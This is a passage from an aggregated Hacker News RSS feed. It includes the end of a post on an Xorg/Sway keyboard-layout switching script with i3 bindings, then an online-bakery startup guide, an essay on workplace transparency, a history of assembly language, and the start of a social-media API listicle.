<p>Now, we need a script that switches between layouts. To load an layout in Xorg, we use</p>
<div><pre><code data-lang="bash">xkbcomp ~/.xkb/normal.xkb <span>"</span>$DISPLAY<span>"</span>
</code></pre></div><p>Sway supports this via the input command in the following form.</p>
<div><pre><code data-lang="bash">swaymsg input <span>'*'</span> xkb_file ~/.xkb/normal.xkb
</code></pre></div><p>The following script cycles through the layouts when it is called. It also
allows to add more layouts later (just add them to layouts array and it will
cycle in the order of the array).</p>
<div><pre><code data-lang="bash"><span>#!/usr/bin/env bash
</span><span></span><span># Usage: xkb_swapper.sh [layout_name]</span>

<span>function</span> set_layout<span>()</span> <span>{</span>
	echo <span>"Setting layout to </span>$1<span>"</span>
	<span>if</span> <span>[[</span> -v WAYLAND_DISPLAY <span>]]</span>; <span>then</span>
		swaymsg input <span>'*'</span> xkb_file ~/.xkb/<span>"</span>$1<span>"</span>.xkb
	<span>else</span>
		xkbcomp ~/.xkb/<span>"</span>$1<span>"</span>.xkb <span>"</span>$DISPLAY<span>"</span>
	<span>fi</span>
	echo <span>"</span>$1<span>"</span> &gt; ~/.cache/xkb-curr-<span>"</span>$DISPLAY<span>"</span>
<span>}</span>
layouts<span>=(</span>insert normal<span>)</span>
current_layout<span>=</span><span>$(</span>cat ~/.cache/xkb-curr-<span>"</span>$DISPLAY<span>"</span> <span>||</span> echo <span>""</span><span>)</span>

<span>if</span> <span>[[</span> $1 !<span>=</span> <span>""</span> <span>]]</span>; <span>then</span>
	set_layout <span>"</span>$1<span>"</span>
	exit
<span>fi</span>
<span>if</span> <span>[[</span> $current_layout <span>==</span> <span>""</span> <span>]]</span>; <span>then</span>
	echo <span>"No current layout found!"</span>
	set_layout <span>"</span><span>${</span>layouts[0]<span>}</span><span>"</span>
<span>fi</span>

i<span>=</span><span>0</span>
<span>while</span> <span>[[</span> $i -lt <span>${#</span>layouts[@]<span>}</span> <span>]]</span>; <span>do</span>
	<span>if</span> <span>[[</span> $current_layout <span>==</span> <span>"</span><span>${</span>layouts[$i]<span>}</span><span>"</span> <span>]]</span>; <span>then</span>
		new_idx<span>=</span><span>"</span><span>$((</span>i+1<span>))</span><span>"</span>
		<span>if</span> <span>[[</span> $new_idx -eq <span>${#</span>layouts[@]<span>}</span> <span>]]</span>; <span>then</span>
			set_layout <span>"</span><span>${</span>layouts[0]<span>}</span><span>"</span>
		<span>else</span>
			set_layout <span>"</span><span>${</span>layouts[$new_idx]<span>}</span><span>"</span>
		<span>fi</span>
		exit
	<span>fi</span>
	<span>((</span>i++<span>))</span>
<span>done</span>

echo <span>"Current Layout doesn't exist!"</span>
set_layout <span>"</span><span>${</span>layouts[0]<span>}</span><span>"</span>
</code></pre></div><p>The above script works with all Xorg based DE/WMs as well as Sway (wayland
compositor). I saved it as <code>xkb_swapper.sh</code> in my <code>PATH</code>. Calling the script
without any argument cycles through the layouts. If arguments are passed, the
first argument is taken as layout name and layout is changed to that.</p>
<p>The last step is binding the function keys and <code>Alt_R</code> to commands to execute.
Here are some of the parts of my i3 config that bind the function keys.</p>
<pre><code>bindsym Alt_R exec xkb_swapper.sh
bindsym 0xffca kill
bindsym 0xffcf exec volchange -5
bindsym 0xffd0 exec volchange +5
bindsym 0xffd1 exec brightness -200
bindsym 0xffd2 exec brightness +200
bindsym 0xffcb exec mpc prev
bindsym 0xffcc exec mpc toggle
bindsym 0xffcd exec mpc next
</code></pre><p><code>i3</code> doesn’t seem to accept <code>F13</code> - <code>F35</code> as keynames however it accepts the
keycodes<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.  Here is a small list for easy access.</p>
<pre><code>0xffbe   F1
0xffbf   F2
0xffc0   F3
0xffc1   F4
0xffc2   F5
0xffc3   F6
0xffc4   F7
0xffc5   F8
0xffc6   F9
0xffc7   F10
0xffc8   F11
0xffc9   F12
0xffca   F13
0xffcb   F14
0xffcc   F15
0xffcd   F16
0xffce   F17
0xffcf   F18
0xffd0   F19
0xffd1   F20
0xffd2   F21
0xffd3   F22
0xffd4   F23
0xffd5   F24
0xffd6   F25
0xffd7   F26
0xffd8   F27
0xffd9   F28
0xffda   F29
0xffdb   F30
0xffdc   F31
0xffdd   F32
0xffde   F33
0xffdf   F34
0xffe0   F35
</code></pre>
<p>The script stores the mode in <code>~/.cache/xkb-curr-$DISPLAY</code>. <code>cat</code> that and
wrap in your bar’s config. Here is my config for
<a href="https://github.com/greshake/i3status-rust">i3status-rust</a>.</p>
<div><pre><code data-lang="toml">[[<span>block</span>]]
<span>block</span> = <span>"custom"</span>
<span>command</span> = <span>"echo -en '\\uf11c '; cat ~/.cache/xkb-curr-$DISPLAY"</span>
<span>interval</span> = <span>0.5</span>
</code></pre></div><section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>As always, the <a href="https://wiki.archlinux.org/index.php/X_keyboard_extension">Arch Wiki page on XKB</a> is a nice place to start. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>You can find all the defined keys in <code>/usr/include/X11/keysymdef.h</code>. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

      </div></div></div>]]>
            </description>
            <link>https://cedaei.com/posts/vim-like-layer-for-xorg-wayland/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271904</guid>
            <pubDate>Tue, 25 Aug 2020 14:51:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Start an Online Bakery (Or transfer an existing one online)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271789">thread link</a>) | @porthas
<br/>
August 25, 2020 | https://www.mightyforms.com/blog/how-to-start-an-online-bakery-or-transfer-an-existing-one-online | <a href="https://web.archive.org/web/*/https://www.mightyforms.com/blog/how-to-start-an-online-bakery-or-transfer-an-existing-one-online">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>If there is one thing that is certain in these uncertain times is that the current pandemic has forever changed how businesses operate.</p><p>It also changed how we shop. Right now, having an online bakery can be the answer to your questions on how to use your kitchen gifts to profit.</p><p>Starting a new business requires courage. But, if you got here, it shows that you are brave enough to put the idea into practice. So, roll up your sleeves and let’s get started. It’s time to work on your new online bakery.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287bb0207e2c729c3793fb_University%20Application%20Process%20Infographic%20(1).jpg" alt="How to start an Online Bakery infographic _MightyForms"></p></figure><p>‍</p><p>These tips can work for a new business or if you are transferring your current bakery to an online store.</p><h2><strong>1. Write A Business Plan Specific for Your Online Bakery</strong></h2><p>Going online is easy. Getting results online, that’s a different story. But you can’t start anything without a proper plan first.&nbsp;</p><p>Having a detailed action plan will guide you every step of the way. It also helps you determine and learn to prioritize several important tasks that are part of having a business.&nbsp;</p><p>It doesn’t hurt to create a <a href="https://www.sba.gov/business-guide/plan-your-business/write-your-business-plan">lean business plan</a> at first since it allows you to be more flexible once you start your online bakery.</p><p>After careful review of the resources found in the U.S. Small Business Administration (SBA) website, we summed up how to write a business plan for an online bakery:</p><h3><strong>Value Proposition</strong></h3><p>Any business plan needs a value proposition. In a few words, you should be able to describe what goods you are going to offer. In a bakery case, it will be bread, cakes, donuts, sweets, and other kinds of cottage food. Then you define the range of products you are offering.&nbsp;</p><p>As a bakery, you can offer a large range of products. But, it’s interesting to narrow down and specialize your bakery on a few key bakes.</p><h3><strong>Market Need</strong></h3><p>Always be aware of what the market’s needs are, especially since they can often change. You can open an online bakery but get no results unless you investigate what the market is going for.&nbsp;</p><p>Explore your region to make sure you are not just offering more of the same. Observe if there is any demand for some specific product. Decide what you can offer and how you can do it. You can start your production offering what your region needs more. Sometimes that can be birthday cakes, but it can also be simple daily bread.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287f3d6a4df90473d1ad1b_hands-731265_1920.jpg" alt="hands baking"></p></figure><h3><strong>Solution Proposition</strong></h3><p>Now that you investigated what the market’s needs are, it’s time to give a solution. You already know what your region is demanding. Now, give the solution by offering a demanding product. And, of course, something more. You can, as an example, offer personalized cupcakes, vegan options, gluten-free, and so on.</p><h3><strong>Sales System</strong></h3><p>How are you going to sell your products? How are you going to deliver the sold goods? These are questions you must think when building the business plan. After all, you are selling delicate products, and on an internet base. You must have the plan very well-built, predicting any possible trouble you may have. You must decide how is going to be the payment method and if you are going to use an <a href="https://www.mightyforms.com/blog/how-to-create-an-order-form">order form.</a> Are you using Instagram for your sales? A website? Or both? Study your target market and see which way is better for selling.</p><h3><strong>Costs and Expenses</strong></h3><p>In your business plan, you must add any prediction of what you are going to spend during the process. These predictions must include:</p><ul role="list"><li>Kitchen renovation;</li><li>Equipment;</li><li>Supplies;</li><li>Ingredients;</li><li>License fees;</li><li>Insurance.</li></ul><h2><strong>2. Start Focusing On Marketing&nbsp;</strong></h2><p>You want your business to be successful. For this, you must be known, recognized, and seen. Your marketing strategy must focus on target customers. When you have an ideal client and focus any effort on delight them your chance of success is greater. But, what kind of strategy can you use for your online bakery? Here are three examples of how you can do your marketing strategy.<br></p><h3><strong>Create a Website</strong></h3><p>A website is the easiest way to divulge your bakery. Besides, this can be how you sell your products, as well. You are going to display your products on several landing pages. Write some content to go with the product description. You can also add order forms, intake forms, and contact forms to assist your prospect make an order or get in touch with you. Make your business easy to be found online.</p><h3><strong>Use Social Media&nbsp;</strong></h3><p>In a pandemic world where everyone is communicating remotely, it is easy to understand the importance that social media has gained. The past months changed the world and put a new perspective on how business must work. And an online bakery is exactly what people need right now. Use all the tools you have to sell your products.&nbsp;</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287f7a068aa869efa6c5b6_social-media-1795578_1920.jpg" alt="Social media icons - MightyForms"></p></figure><p>Use social media that focuses more on the visual, like<strong> Pinterest and Instagram,</strong> to show your beautiful merchandise and sell it as well. Instagram is the main social media for food products. Use it without fear. Don’t forget any other social media that exists so you can profit and thrive. Don’t be shine. Use social media in favor of your online bakery.&nbsp;</p><h3><strong>Encourage Word of mouth</strong></h3><p>Word of mouth is still one of the most useful mechanisms of marketing. People that know your work and enjoy it can refer to friends and family. And you can also do it yourself by talking about your online bakery for everyone in your community. Besides asking for friends and family for assistance.&nbsp;Share campaigns and giveaways are two examples on how you can start word of mouth marketing.</p><p>‍<br></p><blockquote><strong>Fast fact: Messenger Apps As Your New Tool For Getting Close To The Customer: </strong>The modern world brings several tools and technologies to help the entrepreneur’s life. Online messengers, such as WhatsApp, Telegram, and Facebook Messenger, are tools that allow you to contact your prospects easily. And make your business open to new customers. For some places, it can help your business create a better set of contact with customers, which means more trust in your business. You can use online messengers to promote your bakery for everyone you have on your contact list and ask for them to do the same. Be aware of which of the messengers works better in your region.</blockquote><h2><strong>3. Define Your Online Bakery Specialty</strong></h2><p>The world is going into specialized markets. So should your online bakery. Your specialty can be personalized frosting, or maybe your products are all vegan or gluten-free. Or you can create your own recipes. Or you can offer products inspired by recipes from other countries. No matter how you do it, as long as you do it.&nbsp;</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287d75063b890c9bae4dab_stephanie-leblanc-NZH0p2_2kMo-unsplash.jpg" alt="Specialized bakery"></p></figure><h3><strong>Why have a specialty?</strong></h3><p>When you have a specialty,&nbsp; it makes it easier to stand out from your competitors. Focusing on a few types of products, you can get more specific feedback to improve your product, define your business, and become a reference for that specialty.</p><p>Starting as an original niche is going to highlight your business against your backdrop of competitors. That can be the winning card for your bakery. It doesn’t mean that you can’t have various products, it only means that you have one type that is your masterpiece.</p><h2><strong>4. Prepare The Offline Background&nbsp;</strong></h2><p>When you’re starting any business you need to know in advance the cost of every tool and resource you need to get the gears running. In the case of an online bakery, you need not only an online marketing strategy, but you also need to consider the offline background of workspace, tools, and supplies.&nbsp;</p><p><strong>Investigate all the costs of starting your home bakery and the ongoing expenses</strong>. You must have projections of any costs you will have during the production and distribution. And calculate into your business pricing.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287fb0b52c819bc38ec2cf_taylor-grote-LqkFX2Km1a0-unsplash.jpg" alt="Cupcakes in oven "></p></figure><p>‍</p><p>Other aspects to consider are:</p><ul role="list"><li><strong>Space. </strong>Any production requires a certain space. Be sure you have the proper place to start your production. It must be clean, sanitized, large enough so you can prepare your tasty treats. Watch over your local regulation as well. See if you can use your home kitchen, or if you need a separate space to start baking.</li><li><strong>Equipment. </strong>If you are going to bake cakes you must have the proper equipment, that is different for cookies, cupcakes, bread, etc. For each kind of specialty, you must be prepared with the proper kind of equipment. Be sure you have the right oven, fridge, and kitchen utensils.</li><li><strong>Employees. </strong>Think about it: <em>Does your business need anyone else to help?</em> Maybe you need someone to make the deliveries or to assist you in baking. No matter the reason, you must be prepared to hire someone if it is the case. Study your business and try to see if or when you are going to start hiring. Again, pay close attention to your state and county laws.</li><li><strong>Supply. </strong>You can’t prepare food without the right ingredients. Put in your account all the supplies you may need to use when cooking. Don’t ever let any of your main ingredients lack in your kitchen. You must have in hand everything you need before starting baking. Organize your space and pantry.</li></ul><h2><strong>5. Register your business</strong></h2><p>At last, but not least, comes the registration of your new business, or the transferred one. It must be registered according to any legal aspect that exists for home bakery and cottage food, both at state and local levels.&nbsp;</p><p><strong>State laws </strong>must be observed. As an example, we have Indiana, where you can’t produce cottage food in your residence and Ohio, where to be considered cottage food it must be made in a residence kitchen. Therefore, look with close attention to understand your own state and local legalization. You can always consult the <a href="https://www.chlpi.org/flpc-releases-cottage-food-laws-united-states-report/">Harvard Law School: Food Law and Policy Clinic (FLPC) report</a>. In this report, they clarify what each state determines for cottage food and home bakery.</p><p>Besides looking for any regulation, you must guarantee that you have licenses, certifications, and health requirements. All to be sure that your business can function properly and legally. For State information about <a href="https://www.mightyforms.com/blog/small-business-forms">how to open a small business</a>, you can consult <a href="https://www.sba.gov/blogs/">the U.S. Small Business Administration.</a></p><h3><strong>Changes in the kitchen or baking space</strong></h3><p>Depending on the state laws for home bakery and cottage food you may need to change aspects from your residence. Some changes are necessary and can guarantee the safety of not only your business but also your family.</p><p>We are talking about installing sprinkler systems and …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mightyforms.com/blog/how-to-start-an-online-bakery-or-transfer-an-existing-one-online">https://www.mightyforms.com/blog/how-to-start-an-online-bakery-or-transfer-an-existing-one-online</a></em></p>]]>
            </description>
            <link>https://www.mightyforms.com/blog/how-to-start-an-online-bakery-or-transfer-an-existing-one-online</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271789</guid>
            <pubDate>Tue, 25 Aug 2020 14:40:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Transparency and Good Intent]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271786">thread link</a>) | @danso
<br/>
August 25, 2020 | https://boz.com/articles/transparency | <a href="https://web.archive.org/web/*/https://boz.com/articles/transparency">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>It is wise to assume <a href="https://en.wikipedia.org/wiki/Hanlon%27s_razor">good
intent</a> of your colleagues. It
is also wise to assume your colleagues may not all do the same for you. Being
transparent can help remove any doubt that you are acting in good faith.</p>
<p>Transparency can be scary. It sometimes means weighing in sooner than you
might otherwise be comfortable, with less information, and with unpolished
thoughts. It often means taking a position and having to revise it later. But
occasionally being wrong in front of others and owning up to it is precisely
what allows us to be trusted as
<a href="https://boz.com/articles/authenticity">authentic</a>.</p>
<p>Transparency is not a mythical state of being. It is a set of simple
practices:</p>
<ul>
<li>Be responsive. At Facebook, in particular, being unresponsive is seen as
very disrespectful. That doesn’t mean people get to hijack your schedule with
any email they send. It means they will get a timely response that sets their
expectations for when they can expect a full response. As a transparency bonus
you may even find it helpful to share what work you are prioritizing instead.</li>
<li>Be open. If you have concerns but wait until a conversation is almost closed
to raise them it can surprise people and invite them to wonder if you have
ulterior motives for derailing the progress of the group. Instead be open
about what you are thinking even if it isn’t fully thought through yet. Just
make sure you preface it with the fact that you are still thinking things
through and may change. That allows others to understand and participate not
only around the concern but also your mental processes.</li>
<li>Be proactive. When you arrive at a position that impacts others they should
ideally hear about it from you. I always tell people if I have feedback for
them they will hear it from me first. Those who have worked with me for a
while can likely vouch that I am as good as my word. That allows people to
feel confident that if they haven’t heard from me then there is nothing new
they need to know. No news really is good news.</li>
<li>Be consistent. Few things create conspiracies faster than a message that is
adapted for different audiences. When people invariably exchange notes and
discover they were told different things their minds immediately jump to
malice.</li>
<li>Communicate at scale. Writing or speaking to larger groups is greater
transparency not only because it extends to more people but because those
people now all have <a href="https://boz.com/articles/mutual-knowledge">mutual
knowledge</a> of your mindset.</li>
</ul>
<p>When it comes to maintaining trust many people work hard to avoid mistakes.
But mistakes do far less damage to trust than secrecy does.</p></section></div></div>]]>
            </description>
            <link>https://boz.com/articles/transparency</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271786</guid>
            <pubDate>Tue, 25 Aug 2020 14:40:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why would you want more than machine language?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271652">thread link</a>) | @mxek
<br/>
August 25, 2020 | https://blog.deta.sh/posts/assembly/ | <a href="https://web.archive.org/web/*/https://blog.deta.sh/posts/assembly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <header>
    
    <time datetime="2020-03-05T00:00:00Z">March 05, 2020</time>
  </header>
  

<p><strong><em>(a short history of the birth of assembly)</em></strong></p>

<p>The use of assembly language and an assembler was an idea that evolved at the dawn of early digital <em>stored program computers</em>, in the decade following the Second World War. <a href="https://en.wikipedia.org/wiki/Richard_Hamming">Richard Hamming</a> reports an estimate that the use of assembly language represented a 2x improvement on programmer productivity <a href="#hamming">[p. 31]</a>.</p>

<p>Nonetheless, it took awhile to catch on amongst experienced programmers, many of whom continued to program in the earlier <em>machine code</em>.  Hamming reports of these programmers dismissing assembly as ‘sissy stuff’ and there are legends of towering figures in computing being quite dismissive of it. This piece is a short historical survey of the early development behind initial assembly languages and samples some of these early reactions to it.</p>

<h2 id="programming-before-assembly">Programming Before Assembly</h2>

<p>At the dawn of assembly, the model of computing which was taking shape was that of the <em>stored program computer</em>. The ideas for the <em>stored program computer</em> sprang out of the <a href="https://en.wikipedia.org/wiki/ENIAC">ENIAC Project</a> and its shortcomings.  One of the early shortcomings of the ENIAC was that it required significant hardware modifications each time a new program was run <a href="#campbell">[p.75]</a>.  <a href="https://en.wikipedia.org/wiki/John_von_Neumann">John von Neumann</a> did consulting work on this project and outlined the ideas for improvement from this collaboration with the ENIAC team in the <a href="http://web.eah-jena.de/~kleine/history/machines/VonNeumann-1stDraftReportEDVAC.pdf">initial report on the EDVAC</a>, though there are questions about who should get credit for the ideas <a href="#hamming">[p. 24]</a><a href="#campbell">[p. 77]</a>.</p>

<p>One of the most important of these ideas was to organize the computer such that the program being executed is itself also stored in the computer’s memory–this way, the computer itself did not need to be tediously reconfigured for each new program <a href="#campbell">[p. 75-76]</a>.</p>

<h2 id="what-is-assembly">What is Assembly?</h2>

<p>Stored program computers understand and can execute <em>machine code</em>, code expressed in numerical form (many of the earliest computers in pure binary). Below is a very short snippet of a more modern version of such machine code:</p>

<p><code>6689C3</code></p>

<p>From a human’s perspective, it’s not very intuitive, and if you are not incredibly immersed in a specific set of machine code, it is  <em>meaningless</em>.</p>

<p>In contrast, the below code is something a human with knowledge of English can get some type of idea about, even with little background.</p>

<p><code>mov bx, ax</code></p>

<p>The second snippet is assembly code, which is read by an <em>assembler</em> and translated into the first snippet for execution by a computer.</p>

<p>In <em>Assemblers and Loaders</em>, an assembler is described as <a href="#saloman">[p. 1]</a>:</p>

<blockquote>
<p>… a translator that translates source instructions (in symbolic language) into target instructions (in machine language), on a one to one basis.</p>
</blockquote>

<p>For early <em>stored program computers</em>, humans had to <em>first do this translation</em> themselves <em>before</em> they could execute the programs. The idea behind assembly was to <em>use the machine itself</em> to translate between a more programmer friendly notation and the code the machine could understand, because computers are great at manipulating symbols at a high speed and precision <a href="#campbell">[p. 168]</a>. <a href="https://en.wikipedia.org/wiki/Richard_Hamming">Richard Hamming</a> reports an estimate that the use of assembly language represented a 2x improvement on programmer productivity <a href="#hamming">[p. 31]</a>.</p>

<h2 id="the-development-of-assembly-on-early-stored-program-computers">The Development of Assembly on Early Stored Program Computers</h2>

<p>Inspired by von Neumann and the ideas in the EDVAC report, two British research camps started working on stored program computers at the end of the 1940s, leading to some of the earliest assemblers.</p>

<p><a href="https://en.wikipedia.org/wiki/Andrew_Donald_Booth">Andrew Booth</a> led the ARC project out of Birbeck College, with <a href="https://en.wikipedia.org/wiki/Kathleen_Booth">Kathleen Booth</a> (born as Britten) as an assistant — Kathleen is credited with creating an assembler for the ‘ARC2’. Meanwhile, <a href="https://en.wikipedia.org/wiki/Maurice_Wilkes">Maurice Wilkes</a> led the EDSAC project out of Cambridge with David Wheeler as an assistant — Wheeler is credited with creating the EDSAC’s assembler <a href="#campbell">[p. 81]</a>.</p>

<p>The tedium of translating human symbolic understandings of programs into machine-readable programs led to the early assemblers.</p>

<h3 id="the-arc-project-kathleen-booth">The ARC Project &amp; Kathleen Booth</h3>

<p>Kathleen was working with Andrew on the ARC, a specialized computer for calculating Fourier synteses 12-24x faster than a research student could do using traditional methods <a href="https://www.ams.org/journals/mcom/1954-08-046/S0025-5718-54-99336-9/S0025-5718-54-99336-9.pdf">[p. 102]</a>. After visiting von Neumann in Princeton, they constructed the ARC2, which was a <a href="https://www.i-programmer.info/history/people/1253-andrew-booth.html">‘stored program computer’</a>.</p>

<p>She and her husband released a few publications about this machine in 1947, one of which is <a href="http://www.mt-archive.info/Booth-1947.pdf"><em>General Considerations in the Design of an All Purpose Electronic Digital Computer</em></a>. The second, <em>Coding For A.R.C</em>, is believed to contain her <a href="https://hackaday.com/2018/08/21/kathleen-booth-assembling-early-computers-while-inventing-assembly/">assembly language for the ARC2</a>. There is little documented about this second report and, as far as we know, there is no digital copy of <em>Coding For A.R.C.</em>. Birbeck College only goes as far as to say she <a href="https://www.dcs.bbk.ac.uk/about/history/">‘developed a very early assembly language’</a>.</p>

<h3 id="edsac-david-wheeler">EDSAC &amp; David Wheeler</h3>

<p>The story of David Wheeler and the EDSAC is more widely documented.</p>

<p>As it goes, Maurice Wilkes led the EDSAC project (after visiting the United States and learning about the EDVAC) to launch a stored program computer at Cambridge University. The EDSAC became operational in May 1949 <a href="#campbell">[85]</a>. During this project Wilkes noticed that ‘assembling’ <em>is something computers are well equipped to do;</em> he put David Wheeler on this job for a doctorate project <a href="#campbell">[168-169]</a>.</p>

<p>The result of this project was the <em>Initial Orders</em> program, completed in May 1949, which would translate more human friendly punched codes into binary, and was loaded into memory as a <a href="https://www.cl.cam.ac.uk/~mr10/Edsac/edsacposter.pdf">‘bootstrap program’</a>.</p>

<p>Wikipedia cites the earlier source crediting Kathleen Booth as the inventor of assembly. Her <em>Coding for A.R.C.</em> piece was released in 1947, while Wheeler’s Initial orders came online later in 1949. He is credited by the IEEE Computer Society as having created the first <a href="https://www.computer.org/profiles/david-wheeler">‘assembly language’</a>. As far as we are aware, there is no digital copy of <em>Coding for A.R.C.</em>, and it is something we would love to see come online.</p>

<h3 id="ibms-early-commercial-assemblers">IBMs Early Commercial Assemblers</h3>

<p>In the early 1950s, IBM’s first commercial computers also had assemblers running. These assemblers took another step forwards from the early academics who developed assemblers. The earlier assemblers used more human friendly symbols for ‘operations’, but computer addresses were still fixed in a program’s code. This had the downside that programmers who encountered and corrected bugs needed to re-assign a chain of subsequent addresses by hand or use an alternate method and end up with ‘spaghetti code’ <a href="#hamming">[p. 25]</a>.</p>

<p>With IBM’s assemblers, <em>symbolic</em> addresses were introduced, where the assembler did the work of address assignment for the programmer <a href="https://blog.deta.sh/posts/assembly/(https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=4640454)">[p. 116]</a>. Both IBM’s first commercial scientific (<a href="https://en.wikipedia.org/wiki/IBM_701">the 701</a>) and business (<a href="https://en.wikipedia.org/wiki/IBM_650">the 650</a>) computers had assembly languages with symbolic addresses. For the 701, Nathaniel Rochester developed the <a href="https://ia600101.us.archive.org/25/items/symbolic-programming/Image111817152723.facing_text.pdf">*Symbolic Assembly Program (SAP) in 1953</a>. For the 650, Stan Poley <a href="http://www.columbia.edu/cu/computinghistory/650.html">developed SOAP in 1955</a>, which improved the performance of programs by the intelligent assignment of addresses <a href="#saloman">[p. 16]</a>.</p>

<h2 id="early-responses-to-assembly">Early Responses to Assembly</h2>

<p>Though most of the following perspectives are largely anecdotal, they suggest there is evidence that using <em>assembly language</em>, or anything higher than machine code, took time to catch on among practicing programmers and faced tremendous skepticism, even from earlier figures of our story, like Von Neumann (credit to <a href="http://worrydream.com/dbx/">this presentation</a> for the sources).</p>

<p><a href="http://ei.cs.vt.edu/~history/VonNeumann.html">John Lee</a> reports anecdotes from von Neumann himself questioning the use of anything higher than machine code :</p>

<blockquote>
<p>In the 1950’s von Neumann … was confronted with the FORTRAN concept; John Backus remembered von Neumann being unimpressed and that he asked “why would you want more than machine language?” …</p>

<p>… Donald Gillies, one of von Neumann’s students at Princeton, and later a faculty member at the University of Illinois, recalled in the mid-1970’s that the graduates students were being “used” to hand assemble programs into binary for their early machine (probably the IAS machine). He took time out to build an assembler, but when von Neumann found out about he was very angry, saying (paraphrased), “It is a waste of a valuable scientific computing instrument to use it to do clerical work.”</p>
</blockquote>

<p>Richard Hamming, writing about programming on the IBM 701 (the same machine Rochester developed the assembler for) <a href="#hamming">[p. 25]</a>:</p>

<blockquote>
<p>I once spent a full year, with the help of a lady programmer from Bell Telephone Libraries, on one big problem coding in absolute binary for the IBM 701, which used all the 32K registers then available. After that experience I vowed never again would I ask anyone to do such labor. Having heard about a symbolic system from Poughkeepsie, IBM, I ask[ed] her to send for it and to use it on the next problem…As I expected, she reported it was much easier…</p>

<p>So we told everyone about the new method, meaning about 100 people …</p>

<p>… To my knowledge only one person —yes, only one—of all 100 showed any interest!</p>
</blockquote>

<p>He also writes (most probably about <a href="#ibms-early-commercial-assemblers">Rochester’s system for the 701</a>) <a href="#hamming">[p. 26]</a>:</p>

<blockquote>
<p>Finally a more complete, and more useful, Symbolic Assembly Program (SAP) was devised after more years than you are apt to believe … most programmers continued their heroic absolute binary programming. At the time SAP first appeared I would guess about 1% of the older programmers were interested in it—using SAP was “sissy stuff” and a real programmer would not stoop to wasting machine capacity to do the assembly.</p>
</blockquote>

<p>As Rochester developed SAP out of Poughkeepsie for IBM, it raises the question if Hamming’s two anecdotes were referring to one and the same event, and the earlier ‘symbolic system’ was also Rochester’s assembler.</p>

<p>Nonetheless, Hamming estimates an initial interest level of about 1% amongst experienced programmers, despite his report of an estimated 2x productivity improvement.</p>

<h2 id="conclusion">Conclusion</h2>

<p>The anecdotal evidence suggests assembly language was far from an overnight success, despite the advantages it offered. Nonetheless zooming forwards, it’s clear that the idea behind assembly took hold. At a more abstract level, the idea of ‘<em>buffering the user from the machine itself</em>’, most likely using the computers themselves to do so, has …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.deta.sh/posts/assembly/">https://blog.deta.sh/posts/assembly/</a></em></p>]]>
            </description>
            <link>https://blog.deta.sh/posts/assembly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271652</guid>
            <pubDate>Tue, 25 Aug 2020 14:26:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best Social Media Posting and Scheduling APIs of 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271513">thread link</a>) | @gbourne
<br/>
August 25, 2020 | https://www.ayrshare.com/best-social-media-posting-and-scheduling-apis-of-2020/ | <a href="https://web.archive.org/web/*/https://www.ayrshare.com/best-social-media-posting-and-scheduling-apis-of-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-node="5f340663d99e7">
	<div>
		
<p>When you manage your social media presence there are two distinct types of posts: manual and automated. </p>



<p>Manual posting and scheduling is when you type up a post and choose a time for it to be published, usually via a <a href="https://www.techradar.com/best/best-social-media-management-tools">scheduling tool</a> (there are some great ones out there). </p>



<p>Automated posting and scheduling is when system generated data automatically posts to your social media networks via your back-end system using an API. </p>



<p>For example, a game company might auto-post when a gamer enters the top-ten leaderboard. Or a news company’ back-end system sees a new breaking headline and automatically schedules the post without manual intervention. If your system has unique dynamic data you should consider publishing to your networks.</p>







<p>Ideally, all scheduling tools would provide an API to programmatically schedule post, but unfortunately most don’t or have <a href="https://buffer.com/developers/api">removed</a> their API access.</p>



<p>When building <a href="https://www.ayrshare.com/">Ayrshare</a> as an API-first social media posting and scheduling tool, we did a lot of research on the APIs available in the market. We would like to share what we have found. </p>



<p>Each tool is broken down by the site name, tagline, API documentation, and pricing. Pricing will vary depending upon the features selected.</p>







<h2>Top Social Media Network APIs</h2>



<h3>1. <a href="https://www.ayrshare.com/"><span><strong>Ayrshare</strong></span></a></h3>



<p><strong>Tagline:</strong> Powerful APIs that enable you to send social media posts effortlessly.</p>



<p><strong>API Documentation</strong>: <a href="https://docs.ayrshare.com/rest-api/overview">link</a></p>



<p><strong>Pricing</strong>: <a href="https://www.ayrshare.com/#pricing">$4.99</a> a month for full access</p>







<h3>2. <a href="https://hootsuite.com/"><span><strong>HootSuite</strong></span></a></h3>



<p><strong>Tagline:</strong> Easily manage all your social media and get results with Hootsuite.</p>



